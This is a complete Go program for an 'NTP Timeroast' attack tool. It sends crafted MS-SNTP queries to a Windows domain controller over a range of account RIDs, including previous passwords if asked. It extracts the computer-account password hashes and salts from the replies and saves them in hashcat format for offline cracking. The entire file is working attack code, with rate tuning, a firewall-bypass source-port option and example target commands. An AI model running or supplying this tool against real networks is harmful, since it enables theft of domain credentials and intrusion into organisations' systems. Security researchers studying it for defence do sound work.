package main

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	RED     = "\033[31m"
	GREEN   = "\033[32m"
	YELLOW  = "\033[33m"
	BLUE    = "\033[34m"
	MAGENTA = "\033[35m"
	CYAN    = "\033[36m"
	WHITE   = "\033[37m"
	BOLD    = "\033[1m"
	RESET   = "\033[0m"
	DIM     = "\033[2m"
)

// NTP query prefix using MD5 authenticator
var NTP_PREFIX = []byte{
	0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a,
}

const (
	DEFAULT_RATE       = 180
	DEFAULT_TIMEOUT    = 24
	DEFAULT_WORKERS    = 10 // This is now used for channel buffering, not concurrent connections
	NTP_PORT           = 123
	EXPECTED_REPLY_LEN = 68
)

type Config struct {
	DCHost     string
	Output     io.Writer
	RIDs       []uint32
	Rate       int
	Timeout    int
	Workers    int 
	OldHashes  bool
	SrcPort    int
	NoColor    bool
}


type Result struct {
	RID  uint32
	Hash []byte
	Salt []byte
}

type Stats struct {
	mu              sync.Mutex
	QueriesSent     int64
	ResponsesRecv   int64
	HashesExtracted int64
	Duplicates      int64
	Errors          int64
	StartTime       time.Time
}

func (s *Stats) IncrementSent() {
	s.mu.Lock()
	s.QueriesSent++
	s.mu.Unlock()
}

func (s *Stats) IncrementReceived() {
	s.mu.Lock()
	s.ResponsesRecv++
	s.mu.Unlock()
}

func (s *Stats) IncrementExtracted() {
	s.mu.Lock()
	s.HashesExtracted++
	s.mu.Unlock()
}

func (s *Stats) IncrementDuplicates() {
	s.mu.Lock()
	s.Duplicates++
	s.mu.Unlock()
}

func (s *Stats) IncrementErrors() {
	s.mu.Lock()
	s.Errors++
	s.mu.Unlock()
}

func (s *Stats) GetStats() (int64, int64, int64, int64, int64) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.QueriesSent, s.ResponsesRecv, s.HashesExtracted, s.Duplicates, s.Errors
}

// Logger
type Logger struct {
	noColor bool
}

func (l *Logger) colorize(color, text string) string {
	if l.noColor {
		return text
	}
	return color + text + RESET
}

func (l *Logger) protocol() string {
	return l.colorize(CYAN+BOLD, "NTP")
}

func (l *Logger) target(host string, port int) string {
	return l.colorize(YELLOW, fmt.Sprintf("%s:%d", host, port))
}

func (l *Logger) success(msg string) {
	fmt.Printf("%s        %s %s\n", l.protocol(), l.colorize(GREEN+BOLD, "[+]"), msg)
}

func (l *Logger) info(msg string) {
	fmt.Printf("%s        %s %s\n", l.protocol(), l.colorize(BLUE+BOLD, "[*]"), msg)
}

func (l *Logger) warning(msg string) {
	fmt.Printf("%s        %s %s\n", l.protocol(), l.colorize(YELLOW+BOLD, "[!]"), msg)
}

func (l *Logger) error(msg string) {
	fmt.Printf("%s        %s %s\n", l.protocol(), l.colorize(RED+BOLD, "[-]"), msg)
}

func (l *Logger) hash(rid uint32, hashStr string) {
	ridStr := l.colorize(MAGENTA, fmt.Sprintf("RID_%d", rid))
	hashDisplay := l.colorize(WHITE+BOLD, hashStr)
	fmt.Printf("%s        %s %s %s\n", l.protocol(), l.colorize(GREEN+BOLD, "[+]"), ridStr, hashDisplay)
}

func (l *Logger) stats(sent, recv, extracted, dups, errs int64, rate float64, elapsed time.Duration) {
	statsStr := fmt.Sprintf("Sent: %s | Recv: %s | Hashes: %s | Rate: %s/s | Elapsed: %s",
		l.colorize(CYAN, fmt.Sprintf("%d", sent)),
		l.colorize(BLUE, fmt.Sprintf("%d", recv)),
		l.colorize(GREEN, fmt.Sprintf("%d", extracted)),
		l.colorize(YELLOW, fmt.Sprintf("%.0f", rate)),
		l.colorize(WHITE, elapsed.Truncate(time.Second).String()))

	if dups > 0 {
		statsStr += fmt.Sprintf(" | Dups: %s", l.colorize(YELLOW, fmt.Sprintf("%d", dups)))
	}
	if errs > 0 {
		statsStr += fmt.Sprintf(" | Errs: %s", l.colorize(RED, fmt.Sprintf("%d", errs)))
	}

	fmt.Printf("%s        %s %s\n", l.protocol(), l.colorize(DIM+BOLD, "[~]"), statsStr)
}

func (l *Logger) banner() {
	banner := `
    ███╗   ██╗████████╗██████╗     ████████╗██╗███╗   ███╗███████╗██████╗  ██████╗  █████╗ ███████╗████████╗
    ████╗  ██║╚══██╔══╝██╔══██╗    ╚══██╔══╝██║████╗ ████║██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝
    ██╔██╗ ██║   ██║   ██████╔╝       ██║   ██║██╔████╔██║█████╗  ██████╔╝██║   ██║███████║███████╗   ██║   
    ██║╚██╗██║   ██║   ██╔═══╝        ██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║   ██║██╔══██║╚════██║   ██║   
    ██║ ╚████║   ██║   ██║            ██║   ██║██║ ╚═╝ ██║███████╗██║  ██║╚██████╔╝██║  ██║███████║   ██║   
    ╚═╝  ╚═══╝   ╚═╝   ╚═╝            ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
`
	fmt.Print(l.colorize(CYAN+BOLD, banner))
	fmt.Printf("                                          %s\n\n", l.colorize(DIM, "by @0xblivion - NTP Timeroast Attack Tool"))
}

func parseRIDRanges(rangeStr string) ([]uint32, error) {
	if rangeStr == "" {
		// Default: return first 10000 RIDs
		rids := make([]uint32, 10000)
		for i := range rids {
			rids[i] = uint32(i + 1)
		}
		return rids, nil
	}

	var rids []uint32
	parts := strings.Split(rangeStr, ",")

	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.Contains(part, "-") {
			// Range format
			rangeParts := strings.Split(part, "-")
			if len(rangeParts) != 2 {
				return nil, fmt.Errorf("invalid range format: %s", part)
			}

			start, err := strconv.ParseUint(strings.TrimSpace(rangeParts[0]), 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid start value: %s", rangeParts[0])
			}

			end, err := strconv.ParseUint(strings.TrimSpace(rangeParts[1]), 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid end value: %s", rangeParts[1])
			}

			if start > end {
				return nil, fmt.Errorf("start value greater than end value: %d > %d", start, end)
			}

			for i := start; i <= end; i++ {
				rids = append(rids, uint32(i))
			}
		} else {
			val, err := strconv.ParseUint(part, 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid RID value: %s", part)
			}
			rids = append(rids, uint32(val))
		}
	}

	return rids, nil
}

func hashcatFormat(rid uint32, hash, salt []byte) string {
	return fmt.Sprintf("%d:$sntp-ms$%s$%s", rid, hex.EncodeToString(hash), hex.EncodeToString(salt))
}

// The total packet length is 68 bytes (48-byte prefix + 4-byte RID + 16-byte dummy checksum).
func createNTPQuery(rid uint32, oldPwd bool) []byte {
	keyFlag := uint32(0)
	if oldPwd {
		keyFlag = 1 << 31
	}

	query := make([]byte, len(NTP_PREFIX)+20)
	copy(query, NTP_PREFIX)

	// Append RID with key flag
	binary.LittleEndian.PutUint32(query[len(NTP_PREFIX):], rid^keyFlag)

	// The rest of the buffer (16 bytes) is already zeroed, serving as the dummy checksum.
	return query
}

// parseNTPResponse extracts RID, hash, and salt from NTP response
func parseNTPResponse(response []byte, oldPwd bool) (uint32, []byte, []byte, bool) {
	if len(response) != EXPECTED_REPLY_LEN {
		return 0, nil, nil, false
	}

	keyFlag := uint32(0)
	if oldPwd {
		keyFlag = 1 << 31
	}

	salt := response[:48]
	ridBytes := response[len(response)-20 : len(response)-16]
	rid := binary.LittleEndian.Uint32(ridBytes) ^ keyFlag
	hash := response[len(response)-16:]

	return rid, hash, salt, true
}

func statsReporter(stats *Stats, logger *Logger, done <-chan bool) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			sent, recv, extracted, dups, errs := stats.GetStats()
			if sent > 0 {
				elapsed := time.Since(stats.StartTime)
				var rate float64
				if elapsed.Seconds() > 0 {
					rate = float64(sent) / elapsed.Seconds()
				}
				logger.stats(sent, recv, extracted, dups, errs, rate, elapsed)
			}
		}
	}
}

func ntpTimeroast(config *Config, logger *Logger) error {
	target := logger.target(config.DCHost, NTP_PORT)
	logger.info(fmt.Sprintf("Starting Timeroast attack against %s", target))

	if config.OldHashes {
		logger.info("Targeting previous computer passwords")
	}

	// The -w/--workers flag is kept for compatibility but doesn't create concurrent connections anymore.
	logger.info(fmt.Sprintf("Configuration: %s queries/sec | %s second timeout",
		logger.colorize(CYAN, fmt.Sprintf("%d", config.Rate)),
		logger.colorize(CYAN, fmt.Sprintf("%d", config.Timeout))))

	logger.info(fmt.Sprintf("Testing %s RIDs", logger.colorize(YELLOW, fmt.Sprintf("%d", len(config.RIDs)))))

	laddr := &net.UDPAddr{Port: config.SrcPort, IP: net.ParseIP("0.0.0.0")}
	raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", config.DCHost, NTP_PORT))
	if err != nil {
		return fmt.Errorf("could not resolve remote address: %w", err)
	}
	conn, err := net.DialUDP("udp", laddr, raddr)
	if err != nil {
		if opErr, ok := err.(*net.OpError); ok && strings.Contains(opErr.Err.Error(), "permission denied") {
			return fmt.Errorf("permission denied to bind to source port %d. Try running as root or using a higher port", config.SrcPort)
		}
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()

	stats := &Stats{StartTime: time.Now()}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Channels and WaitGroups for synchronization
	resultChan := make(chan Result, 100)
	statsDoneChan := make(chan bool)
	var wg sync.WaitGroup

	// Start statistics reporter
	go statsReporter(stats, logger, statsDoneChan)

	wg.Add(1)
	go func() {
		defer wg.Done()
		seenRIDs := make(map[uint32]bool)
		lastResponseTime := time.Now()

		for {
			select {
			case <-ctx.Done():
				return
			default:
				// Set a short deadline to allow checking the context and timeout.
				conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
				response := make([]byte, 120)
				n, _, err := conn.ReadFromUDP(response)

				if err != nil {
					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
						// This is an expected timeout on the read.
						if time.Since(lastResponseTime) > time.Duration(config.Timeout)*time.Second {
							logger.warning(fmt.Sprintf("No response received for %d seconds, stopping.", config.Timeout))
							cancel() // Signal sender to stop
							return
						}
						continue // Continue loop to check context or wait for next packet
					}
					// An actual network error occurred
					stats.IncrementErrors()
					continue
				}

				lastResponseTime = time.Now()
				stats.IncrementReceived()

				respRID, hash, salt, ok := parseNTPResponse(response[:n], config.OldHashes)
				if !ok {
					stats.IncrementErrors()
					continue
				}

				if seenRIDs[respRID] {
					stats.IncrementDuplicates()
					continue
				}
				seenRIDs[respRID] = true
				stats.IncrementExtracted()

				resultChan <- Result{RID: respRID, Hash: hash, Salt: salt}
			}
		}
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		queryInterval := time.Second / time.Duration(config.Rate)
		ticker := time.NewTicker(queryInterval)
		defer ticker.Stop()

		for _, rid := range config.RIDs {
			select {
			case <-ctx.Done(): // Stop sending if context is cancelled (e.g., by timeout)
				return
			case <-ticker.C:
				query := createNTPQuery(rid, config.OldHashes)
				if _, err := conn.Write(query); err != nil {
					stats.IncrementErrors()
				} else {
					stats.IncrementSent()
				}
			}
		}
	}()

	// Result handler needs to run until the result channel is closed.
	var resultWg sync.WaitGroup
	resultWg.Add(1)
	go func() {
		defer resultWg.Done()
		for result := range resultChan {
			hashcatLine := hashcatFormat(result.RID, result.Hash, result.Salt)
			fmt.Fprintln(config.Output, hashcatLine)
			logger.hash(result.RID, hashcatLine)
		}
	}()

	wg.Wait()          
	close(resultChan)  
	resultWg.Wait()    
	close(statsDoneChan)

	// Final statistics
	sent, recv, extracted, dups, errs := stats.GetStats()
	elapsed := time.Since(stats.StartTime)

	logger.success(fmt.Sprintf("Attack completed in %s", elapsed.Truncate(time.Second)))
	if sent > 0 {
		var rate float64
		if elapsed.Seconds() > 0 {
			rate = float64(sent) / elapsed.Seconds()
		}
		logger.stats(sent, recv, extracted, dups, errs, rate, elapsed)
	}

	if extracted > 0 {
		logger.success(fmt.Sprintf("Extracted %s hashes ready for cracking",
			logger.colorize(GREEN+BOLD, fmt.Sprintf("%d", extracted))))
	} else {
		logger.warning("No hashes extracted - check target accessibility and RID ranges")
	}

	return nil
}

func main() {
	var config Config
	var outputFile string
	var ridRange string

	// Parse CLI arguments
	flag.StringVar(&config.DCHost, "t", "", "Target domain controller (required)")
	flag.StringVar(&config.DCHost, "target", "", "Target domain controller (alias for -t)")
	flag.StringVar(&outputFile, "o", "", "Output file for hashes")
	flag.StringVar(&outputFile, "output", "", "Output file for hashes (alias for -o)")
	flag.StringVar(&ridRange, "rids", "", "RID ranges (e.g., '512-580,600-1400')")
	flag.IntVar(&config.Rate, "rate", DEFAULT_RATE, "Queries per second")
	flag.IntVar(&config.Timeout, "timeout", DEFAULT_TIMEOUT, "Timeout in seconds after the last response")
	flag.IntVar(&config.Workers, "w", DEFAULT_WORKERS, "Number of workers (ignored, kept for compatibility)")
	flag.IntVar(&config.Workers, "workers", DEFAULT_WORKERS, "Number of workers (ignored, kept for compatibility)")
	flag.BoolVar(&config.OldHashes, "old", false, "Target previous passwords")
	flag.IntVar(&config.SrcPort, "src-port", 0, "Source port to bind to (e.g., 123 to bypass firewalls). Requires root if < 1024.")
	flag.BoolVar(&config.NoColor, "no-color", false, "Disable colored output")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, `
NTP Timeroast - Domain Controller Password Hash Extraction

Usage: %s -t <target> [options]

Required:
  -t, -target <host>     Target domain controller IP/hostname

Options:
  -o, -output <file>     Output file for hashes (default: stdout)
  -rids <ranges>         RID ranges to test (e.g. '500-1000,1100-1500')
  -rate <int>            Queries per second (default: %d)
  -timeout <int>         Seconds to wait for a response before quitting (default: %d)
  -old                   Target previous computer passwords
  -src-port <int>        Source port to use (default: dynamic). Use 123 for strict firewalls.
  -no-color              Disable colored output
  -w, -workers <int>     (Ignored) Kept for command-line compatibility.

Examples:
  %s -t 192.168.1.10
  %s -t dc.corp.local -rids 500-2000 -rate 300 -o hashes.txt
  %s -t 10.0.0.1 -old -timeout 60 -src-port 123

`, os.Args[0], DEFAULT_RATE, DEFAULT_TIMEOUT, os.Args[0], os.Args[0], os.Args[0])
	}

	flag.Parse()

	logger := &Logger{noColor: config.NoColor}

	if !config.NoColor {
		logger.banner()
	}

	if config.DCHost == "" {
		logger.error("Target domain controller (-t) is required")
		fmt.Println()
		flag.Usage()
		os.Exit(1)
	}

	// Parse RID ranges
	var err error
	config.RIDs, err = parseRIDRanges(ridRange)
	if err != nil {
		logger.error(fmt.Sprintf("Invalid RID ranges: %v", err))
		os.Exit(1)
	}

	config.Output = os.Stdout
	if outputFile != "" {
		file, err := os.Create(outputFile)
		if err != nil {
			logger.error(fmt.Sprintf("Cannot create output file: %v", err))
			os.Exit(1)
		}
		defer file.Close()
		config.Output = file
		logger.info(fmt.Sprintf("Output will be saved to %s", logger.colorize(CYAN, outputFile)))
	}

	if config.Rate <= 0 {
		logger.error("Rate must be positive")
		os.Exit(1)
	}
	if config.Timeout <= 0 {
		logger.error("Timeout must be positive")
		os.Exit(1)
	}

	if err := ntpTimeroast(&config, logger); err != nil {
		logger.error(fmt.Sprintf("Attack failed: %v", err))
		os.Exit(1)
	}
}

